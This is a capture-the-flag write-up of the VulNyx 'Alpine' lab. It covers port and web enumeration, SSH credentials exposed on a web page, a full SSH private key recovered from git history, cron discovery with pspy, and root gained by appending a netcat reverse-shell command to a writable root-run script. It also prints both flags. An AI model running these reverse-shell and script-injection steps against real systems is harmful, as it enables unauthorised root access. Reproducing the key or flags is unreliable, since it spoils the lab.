---
title: "Alpine | VulNyx Writeup"
date: 2026-09-18T17:56:40+05:30
description: "VulNyx Alpine writeup covering web enumeration, exposed profile credentials, Git history disclosure, SSH private key recovery, cron enumeration, and privilege escalation through a writable root-executed script."
summary: "Compromised the Alpine machine by discovering exposed SSH credentials, gaining access as developer, recovering a sysadmin SSH private key from Git history, identifying a root cron job with pspy, and modifying its writable script to obtain a root shell."
platform: "vulnyx"
difficulty: "easy"
os: "Linux"
status: "active"
featured: true
featured_image: "/images/writeups/vulnyx/Alpine.png"
tags: ["linux", "alpine", "web-enumeration", "ffuf", "information-disclosure", "ssh", "credentials", "git", "git-history", "ssh-private-key", "lateral-movement", "pspy", "cron", "file-permissions", "reverse-shell",  "privilege-escalation"]
skills: ["nmap", "ffuf", "linux-enumeration", "ssh", "git", "git-history", "pspy", "cron", "netcat", "file-permissions", "reverse-shell", "busybox", "privilege-escalation"]
comments: false
draft: false
---

## Overview

<img width="842" height="438" alt="alpine-vulnyx" src="/images/writeups/vulnyx/Alpine.png" />

Alpine is an easy VulNyx machine that focuses on web enumeration, credential disclosure, Git history analysis, SSH key exposure, cron enumeration, and privilege escalation through a writable root-executed script.

The attack chain moves from exposed SSH credentials → `developer` → `sysadmin` through a leaked Git SSH key → root through a writable cron script.

### Key Vulnerabilities

- Exposed SSH Credentials
- Sensitive Information Disclosure
- Git Repository History Disclosure
- Exposed SSH Private Key
- SSH Credential / Key Reuse
- Lateral Movement
- Cron Job Enumeration
- Root-Executed Writable Script
- Reverse Shell
- Root Privilege Escalation


---

## 🔎 Enumeration

First, perform a full TCP port scan against the target using Nmap.

```bash
nmap -n -Pn -sVC -p- --min-rate 5000 192.168.1.76
```

### Scan Results

```text
$ nmap -n -Pn -sVC -p- --min-rate 5000 192.168.1.76
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-18 00:07 -0700
Nmap scan report for 192.168.1.76
Host is up (1.0s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.66
|_http-server-header: Apache/2.4.66 (Unix)
|_http-title: Did not follow redirect to http://alpine.nyx/
MAC Address: 08:00:27:FC:69:8E (Oracle VirtualBox virtual NIC)
Service Info: Host: default

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.26 seconds
```

### Findings

- **22/tcp** → SSH running OpenSSH 10.2
- **80/tcp** → HTTP running Apache 2.4.66
- Port `80` redirects to `http://alpine.nyx/`

The discovered domain is:

```text
alpine.nyx
```

---

## 🌐 Web Enumeration

Add the discovered domain to the local hosts file.

```bash
echo "192.168.1.76   alpine.nyx" | sudo tee -a /etc/hosts
```

Now open the domain in a browser:

```text
http://alpine.nyx
```

<img width="1918" height="856" alt="Screenshot_2026-09-18_00_19_31" src="https://github.com/user-attachments/assets/9be4fb36-6fa6-47cb-b987-57e884242ac4" />

The website identifies itself as: `SnowPeak Resort`

The homepage contains information about:

- Chalets
- Activities
- Reviews
- Contact information

No immediately useful information is discovered from the homepage.

---

## 📂 Directory Enumeration

Use FFUF to enumerate accessible files and directories.

```bash
ffuf -u http://alpine.nyx/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -fc 403 -e .html, .php
```

### Results

```text
$ ffuf -u http://alpine.nyx/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -fc 403 -e .html, .php 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://alpine.nyx/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
 :: Extensions       : .html  
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 403
________________________________________________

booking.html            [Status: 200, Size: 3217, Words: 956, Lines: 115, Duration: 355ms]
index.html              [Status: 200, Size: 12461, Words: 4070, Lines: 374, Duration: 250ms]
login.html              [Status: 200, Size: 3182, Words: 957, Lines: 116, Duration: 320ms]
profile.html            [Status: 200, Size: 9571, Words: 4270, Lines: 294, Duration: 182ms]
:: Progress: [14253/14253] :: Job [1/1] :: 178 req/sec :: Duration: [0:01:11] :: Errors: 0 ::
```

The interesting files discovered are:

```text
/booking.html
/index.html
/login.html
/profile.html
```

The `profile.html` page is particularly interesting.

---

## 👤 Profile Enumeration

Navigate to:

```text
http://alpine.nyx/profile.html
```

<img width="1918" height="858" alt="Screenshot_2026-09-18_00_42_26" src="https://github.com/user-attachments/assets/7f881b36-6ddc-42a4-8953-ecfa173b20fe" />

The profile page contains a `Settings`git  section.

Inside the settings page, an interesting section is found:

<img width="1650" height="791" alt="Screenshot_2026-09-18_00_42_38" src="https://github.com/user-attachments/assets/33c64c50-7130-49ef-84fa-16b12f94d4b7" />

The page discloses the following SSH information:

```text
SSH Username: developer
SSH Host: alpine.nyx
SSH Password: SummerVibes2024!
```

These credentials provide SSH access to the target.

---

## 🔐 SSH Access as developer

Use the discovered credentials to establish an SSH connection.

```bash
ssh developer@alpine.nyx
```

### SSH Session

```text
$ ssh developer@alpine.nyx
The authenticity of host 'alpine.nyx (192.168.1.76)' can't be established.
ED25519 key fingerprint is: SHA256:KaFeoyR9O6VOG+rS8vQ4ks7WzsMxs3sO6NVkB0Z5hF8
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'alpine.nyx' (ED25519) to the list of known hosts.
developer@alpine.nyx's password: 
Welcome to Alpine!

The Alpine Wiki contains a large amount of how-to guides and general
information about administrating Alpine systems.
See <https://wiki.alpinelinux.org/>.

developer@alpine:~$ id ; hostname 
uid=1000(developer) gid=1000(developer) groups=1000(developer)
alpine
```

We have successfully obtained SSH access as `developer`.

---

## 📖 README Enumeration

A `README.txt` file is present in the developer's home directory.

Read it:

```bash
cat README.txt
```

### Result

```text
=== SnowPeak Development Notes ===

Hi Developer,

Welcome to the SnowPeak development environment!

IMPORTANT REMINDERS:
1. The sysadmin user manages the webapp code in their directory
2. We use git as a deployment pipeline
3. Don't forget to check the cleaners !

If you need elevated access, contact sysadmin.

- Management
```

The README provides several useful clues:

1. The `sysadmin` user manages the web application.
2. Git is used as a deployment pipeline.
3. The notes specifically mention checking the **cleaners**.

The Git reference suggests that sensitive information may exist in repository history, even if it has been removed from the current working tree.

---

## 📁 Web Application Git Repository

Navigate to the web application's directory.

```bash
cd /home/sysadmin/webapp/
```

List all files, including hidden files:

```bash
ls -la
```

### Result

```text
developer@alpine:~$ cd /home/sysadmin/webapp/
developer@alpine:/home/sysadmin/webapp$ ls -la
total 16
drwxr-xr-x    3 sysadmin sysadmin      4096 Dec 11  2025 .
drwxr-sr-x    4 sysadmin sysadmin      4096 Dec 12  2025 ..
drwxr-xr-x    7 sysadmin sysadmin      4096 Dec 11  2025 .git
-rwxr-xr-x    1 sysadmin sysadmin       171 Dec 11  2025 config.php
```

The important discovery is: `.git`

This means the application contains a Git repository.

---

## 🕰️ Git History Enumeration

Inspect the recent commits.

```bash
git log -n 2
```

### Result

```text
commit 0c6ee270764eb91ee53afc9784881371d4dddd93 (HEAD -> master)
Author: sysadmin <sysadmin@snowpeak.nyx>
Date:   Thu Dec 11 11:14:27 2025 +0000

    Remove backup

commit 02f9a1879dbfa40703a6bcbd985e5a19542c24c8
Author: sysadmin <sysadmin@snowpeak.nyx>
Date:   Thu Dec 11 11:13:53 2025 +0000

    Backup SSH keys before server migration
```

The second commit is particularly interesting: `02f9a1879dbfa40703a6bcbd985e5a19542c24c8` with the commit message: `Backup SSH keys before server migration`

This suggests that an SSH private key may have been committed to the repository.

---

## 🔑 Recover SSH Private Key from Git

Inspect the commit containing the SSH-key backup.

```bash
git show 02f9a1879dbfa40703a6bcbd985e5a19542c24c8
```

The commit reveals an SSH private key stored at:

```text
commit 0c6ee270764eb91ee53afc9784881371d4dddd93 (HEAD -> master)
Author: sysadmin <sysadmin@snowpeak.nyx>
Date:   Thu Dec 11 11:14:27 2025 +0000
commit 02f9a1879dbfa40703a6bcbd985e5a19542c24c8
Author: sysadmin <sysadmin@snowpeak.nyx>
Date:   Thu Dec 11 11:13:53 2025 +0000

    Backup SSH keys before server migration

diff --git a/.ssh-backup/id_rsa b/.ssh-backup/id_rsa
new file mode 100644
index 0000000..76b357a
--- /dev/null
+++ b/.ssh-backup/id_rsa
@@ -0,0 +1,27 @@
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEA3ZnZAOyE5gZN5QxDnRnYnRfXHwCavg4mJz2HbUWI7p3lGi+tdL6u
IbqPyjqbH69DcyQCubvORi4domdpqTchLF7PyJlUBHVIo3AULC1kVhMqGvctWQxAgPRvr7
zM7HGr+NpTPEkM/4BjfJToy706FGjfiXBhjkSiv5cHOlnXxhO44NkKSxvySnXkmYq3PNNF
5OtjZJg+7+XrZKoUsaipupjOcZgsQCx1Yf1xE4gWIi/jS9kY07R0GtNdqaW2Z9UwXYGMFW
xGKPtczHbRgcxtdP9ne71C/Zh5zsTPtgWWx8cO+P0N0emTYNDEMlD+4IH9AygBbnAzY978
qc2jiRSxJwAAA8jbDUur2w1LqwAAAAdzc2gtcnNhAAABAQDdmdkA7ITmBk3lDEOdGdidF9
cfAJq+DiYnPYdtRYjuneUaL610vq4huo/KOpsfr0NzJAK5u85GLh2iZ2mpNyEsXs/ImVQE
dUijcBQsLWRWEyoa9y1ZDECA9G+vvMzscav42lM8SQz/gGN8lOjLvToUaN+JcGGORKK/lw
c6WdfGE7jg2QpLG/JKdeSZirc800Xk62NkmD7v5etkqhSxqKm6mM5xmCxALHVh/XETiBYi
L+NL2RjTtHQa012ppbZn1TBdgYwVbEYo+1zMdtGBzG10/2d7vUL9mHnOxM+2BZbHxw74/Q
3R6ZNg0MQyUP7ggf0DKAFucDNj3vypzaOJFLEnAAAAAwEAAQAAAQAlkP0uoOnurMbru2aC
7WzBRNddFBcnfPKO2Glq5szN1sqN4+M91U1jvmK9362Ic4e1rzcfEW1ojEzNyUYqP4RKJ1
CGKygJEXDc9BUXYCKQTPNoWtq/K8qLkeSVICaFNsf2idxubdvcPIGhDwVf9JYx+41ZmUmQ
eqY0YIADLlPb6g8z0Cgr0cEQg9PEBUi5FZAhji0hIz9k7BAfAzBaed94y+IPF0gG8AtsRm
oo9XlqTuiphbkNyTVPzE9mKoqR8pECqSLAcx5+YBFP6tOoKh1BwHqWBG5ixw3fWi2HvgPv
WeVRTozvXzjP1fVlYi/KyayuOLuiwQrlWvtkXwB4S3cRAAAAgEoibXJoCwzdf1naZQ4yZr
aHnU5Mkx1XsO3X2bWXdIRZzQuLjAlmbwjQyMRWkiRb12D2uc1LwwQ1lzlBOqnCRXjFpM28
/M8V6ZwYMP5bJeOGJSKEaikzY7blksM2Pls2P8zuhLiL3DnvQlB/7whKfME2MwH4tBDYTO
7mS6MbKIElAAAAgQD1zPzaJsyt7gAjYgn/v0Wzj7HfVlLqeLR8TGup5MP8uDq6IJV5pLkf
S8I4dGTOfrhgTw4VNbwy/BZNZErVnKa+zt6EsHgSqFub5ZVgpwRWx6bkk7lKPikZ62uNye
gtqE7uJVBu12Li4kWuzyF2/IhcSh1Sp9B7fnF6p5b+t1H84wAAAIEA5svMbW9WTDB5hvgo
ii5H6OZuIPGNKeEndKVquBeLjKR2QQrK9KQ0d/OgIu4ioEOmQ+NA1tWKr5uXJ4hdBvDCoS
4tqjiIBNSTx1qkV6tpcbKDaIjTzdCvAJ8wOMymShOVVJkmXvgIsJuydR7OQ+StvR0DRDGp
rkFejyhcyFIbke0AAAARc3lzYWRtaW5Ac25vd3BlYWsBAg==
-----END OPENSSH PRIVATE KEY-----
```

Save the recovered key locally as `id_rsa` and restrict its permissions:

```bash
chmod 600 id_rsa
```

---

## 🔐 SSH Access as sysadmin

Use the recovered SSH private key to connect to the `sysadmin` account.

```bash
ssh -i id_rsa sysadmin@alpine.nyx
```

### SSH Session

```text
$ ssh -i id_rsa sysadmin@alpine

Welcome to Alpine!

sysadmin@alpine:~$ id ; hostname
uid=1001(sysadmin) gid=1001(sysadmin) groups=1001(sysadmin)
alpine
sysadmin@alpine:~$
```

We have successfully obtained SSH access as `sysadmin`.

---

## 📖 System Administration Notes

In the `sysadmin` home directory, a `NOTES.txt` file is present.

Read it:

```bash
cat NOTES.txt
```

### Result

```text
=== System Administration Notes ===

TASKS COMPLETED:
[x] Setup webapp git repository
[x] Configure SSH keys for remote access
[x] Clean up sensitive files from git repo

PENDING:
[ ] Speak about the automated cleanup strategy. It currently runs every two minutes


- SysAdmin Team
```

The important information is:

```text
It currently runs every two minutes
```

This suggests that an automated task is periodically executing a cleanup script.

---

## 🔍 Cron Job Enumeration with pspy

Use `pspy64` to monitor running processes and identify scheduled tasks.

Download `pspy64`, make it executable, and execute it:

```bash
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64 && chmod +x pspy64 && ./pspy64
```

### pspy Output

```text
sysadmin@alpine:~$ ./pspy64 
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2026/09/18 11:05:16 CMD: UID=1001  PID=2096   | ./pspy64 
2026/09/18 11:05:16 CMD: UID=1001  PID=2071   | -sh 
2026/09/18 11:05:16 CMD: UID=0     PID=4      | 
2026/09/18 11:05:16 CMD: UID=0     PID=3      | 
2026/09/18 11:05:16 CMD: UID=0     PID=2      | 
2026/09/18 11:05:16 CMD: UID=0     PID=1      | /sbin/init 
2026/09/18 11:06:00 CMD: UID=0     PID=2103   | /usr/sbin/crond -c /etc/crontabs -f 
2026/09/18 11:06:00 CMD: UID=0     PID=2104   | /bin/sh /opt/scripts/cleanup.sh 
2026/09/18 11:06:00 CMD: UID=0     PID=2105   | find /var/tmp -type f -mtime +7 -delete 
2026/09/18 11:06:00 CMD: UID=0     PID=2106   | 
```

The important process is:

```text
/bin/sh /opt/scripts/cleanup.sh
```

It is executed with `UID=0`, therefore the cleanup script is running as `root`.

---

## 📜 Inspect cleanup.sh

Read the cleanup script:

```bash
cat /opt/scripts/cleanup.sh
```

### Result

```text
#!/bin/sh
# System cleanup script
# Cleans temporary files older than 7 days
find /tmp -type f -mtime +7 -delete 2>/dev/null
find /var/tmp -type f -mtime +7 -delete 2>/dev/null
echo "[$(date)] Cleanup completed" >> /var/log/cleanup.log
```

The script performs cleanup operations on `/tmp` and `/var/tmp` and writes a completion message to `/var/log/cleanup.log`.

The script is executed periodically by `cron` as root.

---

## 🔐 Check Script Permissions

Check the permissions and ownership of the script:

```bash
ls -la /opt/scripts/cleanup.sh
```

### Result

```text
sysadmin@alpine:~$ ls -la /opt/scripts/cleanup.sh 
-rwxrwxr-x    1 root     sysadmin       236 Dec 11  2025 /opt/scripts/cleanup.sh
```

Because `sysadmin` has group write permission on the script, the account can modify a script that is executed by `root`.

This creates a privilege-escalation opportunity because commands inserted into the script will execute when the root cron job runs it.

---

## 🐚 Root Reverse Shell

Alpine Linux commonly uses BusyBox `sh`/`ash`, so the Bash `/dev/tcp/HOST/PORT` mechanism may not be available.

Instead, use Netcat to establish the reverse shell.

Start a listener on the attacker machine:

```bash
nc -lnvp 443
```

Append the Netcat reverse-shell command to the root-executed cleanup script:

```bash
echo "nc 192.168.1.28 443 -e /bin/sh" >> /opt/scripts/cleanup.sh
```

When the cron job executes the modified script, the Netcat command runs with root privileges.

---

## 👑 Root Shell

Wait for the scheduled cleanup task to execute.

The listener receives a connection from the target:

```text
listening on [any] 443 ...
connect to [192.168.1.28] from (UNKNOWN) [192.168.1.77] 45283

id ; hostname
uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
alpine
```

The UID is `0`, confirming that the received shell is running as `root`.

---

## 🏁 User Flag

Read the user flag:

```bash
cat /home/developer/user.txt
```

### Result

```text
cat /home/developer/user.txt
30a0cf321ff0c0997f45a7202490b260
```

---

## 🏁 Root Flag

Read the root flag:

```bash
cat /root/root.txt
```

### Result

```text
cat /root/root.txt
6b75b087f12ed42f124d68493469a493
```

---

## 🧾 Summary

| Phase | Technique |
|---|---|
| Network Enumeration | Nmap |
| Web Enumeration | FFUF |
| Domain Discovery | `alpine.nyx` |
| Information Disclosure | `profile.html` |
| Initial Access | Disclosed SSH Credentials |
| User Access | `developer` |
| Local Enumeration | `README.txt` |
| Repository Discovery | Git `.git` directory |
| Credential Discovery | Git commit history |
| Sensitive File | SSH private key |
| Lateral Movement | SSH as `sysadmin` |
| Scheduled Task Discovery | pspy64 |
| Cron Enumeration | `/opt/scripts/cleanup.sh` |
| Privilege Escalation | Writable root-executed script |
| Execution Method | Netcat Reverse Shell |
| Root Access | Root cron execution |
| Flags | User + Root |

---

## 🚀 Key Takeaways

- Perform complete TCP port enumeration before interacting deeply with a target.
- Web pages that appear informational can still expose sensitive configuration data.
- Directory and file fuzzing can reveal functionality that is not linked from the homepage.
- SSH credentials should never be exposed through application pages.
- Git repositories can retain sensitive information even after files are removed from the working tree.
- Always inspect Git history when a `.git` directory is accessible.
- Private SSH keys should never be committed to repositories.
- Process-monitoring tools such as `pspy` can reveal scheduled tasks that are not immediately visible through standard enumeration.
- A root-owned scheduled script must not be writable by an unprivileged group.
- Any command appended to a root-executed writable script can execute with root privileges.
- Alpine Linux uses BusyBox-based utilities, so shell behavior can differ from standard GNU/Linux environments.

---
